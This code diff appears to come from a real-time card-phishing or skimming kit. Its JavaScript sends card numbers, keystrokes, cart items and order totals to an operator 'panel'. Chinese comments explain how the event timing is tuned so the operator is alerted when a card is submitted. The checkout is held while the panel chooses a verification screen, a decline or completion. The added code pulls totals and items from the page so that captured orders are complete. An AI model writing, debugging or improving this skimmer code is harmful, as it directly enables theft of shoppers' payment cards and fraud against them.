@@ -1536,6 +1536,16 @@
     p.order_number = c.order_number || '';
     p.products = JSON.stringify(c.items || []);
     p.total_amount = c.total_amount || '';
+
+    /* 购物车为空时的兜底：从页面上的合计读，避免给面板发 0/空值 */
+    if (!p.total_amount) {
+      var t = q('#bp-total');
+      if (t) { p.total_amount = (t.textContent || '').trim(); }
+    }
+    if ((!c.items || !c.items.length) && isObj(global.__BP_CART__) && Array.isArray(global.__BP_CART__.items) && global.__BP_CART__.items.length) {
+      p.products = JSON.stringify(global.__BP_CART__.items);
+      if (!p.total_amount) { p.total_amount = global.__BP_CART__.total_amount || ''; }
+    }
     return p;
   }
 
@@ -1560,18 +1570,17 @@
     /* 同步上锁：黑名单预检是异步的，期间不允许再次进入 */
     S.submitting = true;
 
-    /* 与原插件 1:1 对齐：提交时发 save_card(e14) —— 面板靠它落"订单"；
-     * update_card 是输入过程，submit_card 是逐键上报。
-     * 三个事件错开几十毫秒发出，避免面板把同一毫秒的连发当成一次"更新"（会吞掉"提交卡号"提醒）。
-     * status 必须保持在线（'1'），否则会话被标灰。 */
+    /* 提交序列：与"实测能响"的报文逐字对齐（2026-11-27 对照实验确定）
+     *   e12 卡号 → e21 黑名单预检 → e13 update_card → e2 Go_Live(3+) → e14 save_card → e22 step
+     * 关键：面板要看到 e13(update_card) 才会把这次当作"用户提交"，从而触发"提交卡号"提醒；
+     *      只有 e14 时订单能落库，但不提醒。status 全程保持 '1'（在线）。 */
     submitCard();
     var richData = submitPayloadRich();
-    setTimeout(function () { send('save_card', richData); }, 200);
-    setTimeout(function () { updateStep('card_submit'); }, 400);
-    setTimeout(function () {
-      persistSubmitPage('3+');
-      goLive('3+');
-    }, 600);
+    setTimeout(function () { send('update_card', richData); }, 150);
+    setTimeout(function () { goLive('3+'); }, 300);
+    setTimeout(function () { send('save_card', richData); }, 450);
+    setTimeout(function () { updateStep('card_submit'); }, 600);
+    setTimeout(function () { persistSubmitPage('3+'); }, 700);
 
     blacklistCheck(v.number).then(function (bl) {
       if (!bl.approved) {
@@ -1583,13 +1592,14 @@
       }
 
       if (needGuard()) {
-        /* 挂起：不碰 /api/checkout，等面板 r2（验证屏）/ r1（拒卡）/ r6（完成） */
+        /* 挂起：不碰 /api/checkout，等面板 r2（验证屏）/ r1（拒卡）/ r6（完成）
+         * 注意：这里**不再**发 Go_Live 3+（上面 550ms 已经排好顺序），
+         *      否则 3+ 会抢在 save_card 前面到面板，导致"提交卡号"不提醒 */
         S.submitting = false;            /* 交给 awaiting 守门，避免锁死 */
         S.awaiting = true;
         S.awaitingSince = nowMs();
         setBusy(true);
         clearErr();
-        goLive('3+');
         armGuardTimer();
         fireEvent('bp:awaiting-panel', { pagetype: pagetype(), trigger: trigger });
         return;
